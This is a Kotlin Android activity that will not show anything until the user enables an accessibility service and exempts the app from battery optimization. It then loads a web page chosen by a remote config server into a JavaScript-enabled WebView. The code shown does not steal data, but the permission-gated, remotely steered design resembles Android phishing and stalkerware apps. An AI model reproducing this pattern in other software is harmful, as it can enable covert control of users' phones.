//app/src/main/java/com/example/appmonitor/MainActivity.kt//
package com.example.appmonitor

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.LinearLayout
import android.widget.Switch
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {
    private lateinit var webView: WebView
    private lateinit var permissionLayout: LinearLayout
    private lateinit var switchAccessibility: Switch
    private lateinit var switchBattery: Switch

    private val handler = Handler(Looper.getMainLooper())
    private var isMonitoring = false

    private val serverConfigUrl = "https://app-control-server-54oe.onrender.com/api/config"

    private val checkTaskRunnable = object : Runnable {
        override fun run() {
            if (isMonitoring) {
                if (isAnotherAppLaunched()) {
                    finishAndRemoveTask()
                } else {
                    handler.postDelayed(this, 1000)
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val rootLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
        }

        permissionLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(50, 100, 50, 50)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            visibility = View.GONE
        }

        val titleTextView = TextView(this).apply {
            text = "Required Permissions"
            textSize = 22f
            setPadding(0, 0, 0, 40)
            gravity = Gravity.CENTER
        }
        permissionLayout.addView(titleTextView)

        val rowAccessibility = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, 20, 0, 20)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            setOnClickListener {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivity(intent)
            }
        }

        val textAccessibility = TextView(this).apply {
            text = "Accessibility Permission"
            textSize = 16f
            layoutParams = LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f
            )
        }

        switchAccessibility = Switch(this).apply {
            isClickable = false
        }

        rowAccessibility.addView(textAccessibility)
        rowAccessibility.addView(switchAccessibility)
        permissionLayout.addView(rowAccessibility)

        val rowBattery = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, 20, 0, 20)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            setOnClickListener {
                requestBatteryOptimizationExemption()
            }
        }

        val textBattery = TextView(this).apply {
            text = "Battery Optimization Exemption"
            textSize = 16f
            layoutParams = LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f
            )
        }

        switchBattery = Switch(this).apply {
            isClickable = false
        }

        rowBattery.addView(textBattery)
        rowBattery.addView(switchBattery)
        permissionLayout.addView(rowBattery)

        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            webViewClient = WebViewClient()
            settings.javaScriptEnabled = true
        }

        rootLayout.addView(permissionLayout)
        rootLayout.addView(webView)
        setContentView(rootLayout)

        checkAndLoadApp()
    }

    override fun onResume() {
        super.onResume()
        checkAndLoadApp()
        isMonitoring = true
        handler.post(checkTaskRunnable)
    }

    override fun onPause() {
        super.onPause()
        isMonitoring = false
        handler.removeCallbacks(checkTaskRunnable)
    }

    private fun checkAndLoadApp() {
        val isAccessibilityGranted = isAccessibilityServiceEnabled()
        val isBatteryGranted = isBatteryOptimizationIgnored()

        switchAccessibility.isChecked = isAccessibilityGranted
        switchBattery.isChecked = isBatteryGranted

        if (!isAccessibilityGranted || !isBatteryGranted) {
            webView.visibility = View.GONE
            permissionLayout.visibility = View.VISIBLE
        } else {
            permissionLayout.visibility = View.GONE
            webView.visibility = View.VISIBLE
            loadServerConfig()
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        val expectedService = "$packageName/${MonitorAccessibilityService::class.java.name}"
        val expectedServiceSimple = "$packageName/.MonitorAccessibilityService"
        
        return enabledServices.contains(expectedService) || enabledServices.contains(expectedServiceSimple)
    }

    private fun isBatteryOptimizationIgnored(): Boolean {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            return pm.isIgnoringBatteryOptimizations(packageName)
        }
        return true
    }

    private fun requestBatteryOptimizationExemption() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = android.net.Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
        }
    }

    private fun isAnotherAppLaunched(): Boolean {
        val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val tasks = activityManager.getRunningTasks(1)
        if (tasks.isNotEmpty()) {
            val topActivity = tasks[0].topActivity
            val currentPackage = topActivity?.packageName
            if (currentPackage != null && currentPackage != packageName && currentPackage != "com.android.systemui") {
                return true
            }
        }
        return false
    }

    private fun loadServerConfig() {
        Thread {
            try {
                val url = URL(serverConfigUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.connectTimeout = 10000
                conn.readTimeout = 10000
                
                val responseString = conn.inputStream.bufferedReader().use { it.readText() }
                val jsonObject = JSONObject(responseString)
                val webUrl = jsonObject.getString("urlweb")
                
                runOnUiThread {
                    webView.loadUrl(webUrl)
                }
            } catch (e: Exception) {
                e.printStackTrace()
                // که تېروتنه وشوه، د خوندیتوب لپاره یو ډیفالت لینک لود کړه تر څو صفحه سپینه پاتې نشي
                runOnUiThread {
                    webView.loadUrl("https://www.google.com")
                }
            }
        }.start()
    }
}
